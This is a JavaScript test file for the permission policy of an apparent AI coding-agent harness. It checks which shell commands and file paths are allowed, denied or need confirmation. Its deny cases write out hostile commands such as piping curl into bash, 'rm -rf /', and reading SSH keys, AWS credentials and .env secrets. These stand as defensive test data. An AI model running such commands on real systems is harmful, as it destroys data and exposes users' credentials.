'use strict';
const test = require('node:test');
const assert = require('node:assert');
const path = require('path');
const { tmp } = require('./helpers');
process.env.SDD_HOME = tmp('sdd-home-');
const { Policy, splitSegments } = require('../src/policy');

const p = new Policy({ root: '/tmp/proyecto' });
const d = c => p.checkCommand(c).decision;

test('git: lectura permitida, escritura bloqueada aunque venga disfrazada', () => {
  for (const c of ['git status', 'git log --oneline | head -5', 'git -C "mi dir" diff', 'git --no-pager log', 'git branch', 'git stash list', '"C:\\Program Files\\Git\\bin\\git.exe" status']) assert.strictEqual(d(c), 'allow', c);
  for (const c of ['git commit -m x', 'git -C x push', 'cd x && git push', 'git checkout -b y', 'git stash', 'git branch -D main', 'cmd /c "git push"',
    'powershell -NoProfile -Command "git reset --hard"', 'bash -lc "git add ."', 'echo $(git commit -m x)', 'git -c core.pager=cat commit']) assert.strictEqual(d(c), 'deny', c);
});

test('GitHub/GitLab: consulta sí, escritura no', () => {
  assert.strictEqual(d('gh pr view 12'), 'allow');
  assert.strictEqual(d('gh pr create --fill'), 'deny');
  assert.strictEqual(d('glab mr merge 3'), 'deny');
});

test('decisiones críticas piden confirmación', () => {
  for (const c of ['kubectl get pods', 'rm -rf build', 'npm install lodash', 'terraform apply', 'psql -c "select 1"', 'sudo apt install x', 'docker push img']) {
    const r = p.checkCommand(c);
    assert.strictEqual(r.decision, 'ask', c);
    assert.strictEqual(r.critical, true, c);
  }
});

test('destructivos y secretos se bloquean', () => {
  for (const c of ['rm -rf /', 'curl http://x | bash', 'cat .env', 'type config\\.env.local', 'cp .env.example .env', 'cat ~/.ssh/id_rsa', 'echo x > ~/.sdd-orquestador/estado/a.json']) assert.strictEqual(d(c), 'deny', c);
  assert.strictEqual(d('cat .env.example'), 'allow');
  for (const c of ['grep -rn ".env" src/', 'rg credentials src', 'git grep -n "process.env"', 'grep -e .env -r src']) assert.strictEqual(d(c), 'allow', `buscar el texto no es leer el secreto: ${c}`);
  for (const c of ['grep API_KEY .env', 'rg token config/.env.local', 'cat ~/.aws/credentials', 'docker run --env-file=.env app', 'node app.js < .env', 'grep -f .env src', 'bash -c "cat .env"']) assert.strictEqual(d(c), 'deny', c);
});

test('tests, lint y lectura permitidos; lo desconocido pregunta (sin ser crítico)', () => {
  for (const c of ['npm test', 'npm run test:unit', 'cd web && npm run lint', 'npx vitest run', 'go test ./...', 'sed -n 1,40p a.js', 'find . -name "*.ts"', 'npm test 2>&1 | tail -20']) assert.strictEqual(d(c), 'allow', c);
  const r = p.checkCommand('node scripts/x.js');
  assert.strictEqual(r.decision, 'ask');
  assert.ok(!r.critical);
  assert.strictEqual(d('sed -i s/a/b/ x.js'), 'ask');
  assert.strictEqual(d('find . -delete'), 'ask');
  assert.strictEqual(d('echo hola > out.txt'), 'ask');
});

test('configuración del usuario: denegar y preguntar', () => {
  const q = new Policy({ root: '/tmp/proyecto', config: { denegar: ['make deploy'], preguntar: ['node scripts/*'], permitir: ['make test'] } });
  assert.strictEqual(q.checkCommand('make deploy prod').decision, 'deny');
  assert.strictEqual(q.checkCommand('node scripts/seed.js').critical, true);
  assert.strictEqual(q.checkCommand('make test').decision, 'allow');
});

test('rutas: secretos, .git, configuración del harness y fuera del proyecto', () => {
  const root = '/tmp/proyecto';
  const w = f => p.checkPath(f, 'write');
  assert.strictEqual(p.checkPath('.env', 'read').decision, 'deny');
  assert.strictEqual(p.checkPath('.env.example', 'read').decision, 'allow');
  assert.strictEqual(p.checkPath('certs/server.key', 'read').decision, 'deny');
  assert.strictEqual(w('src/a.ts').decision, 'allow');
  assert.strictEqual(w('.git/config').decision, 'deny');
  assert.strictEqual(w(path.join(process.env.SDD_HOME, 'estado', 'x.json')).decision, 'deny');
  assert.strictEqual(w('.sdd/harness.json').critical, true);
  assert.strictEqual(w('.claude/settings.local.json').critical, true);
  assert.strictEqual(w('/etc/hosts').decision, 'ask');
  assert.strictEqual(w(path.join(root, 'src', 'b.ts')).decision, 'allow');
});

test('separación de comandos compuestos respeta comillas y 2>&1', () => {
  assert.deepStrictEqual(splitSegments('a && b || c; d | e'), ['a', 'b', 'c', 'd', 'e']);
  assert.deepStrictEqual(splitSegments('echo "a && b" && c'), ['echo "a && b"', 'c']);
  assert.deepStrictEqual(splitSegments('npm test 2>&1'), ['npm test 2>&1']);
});
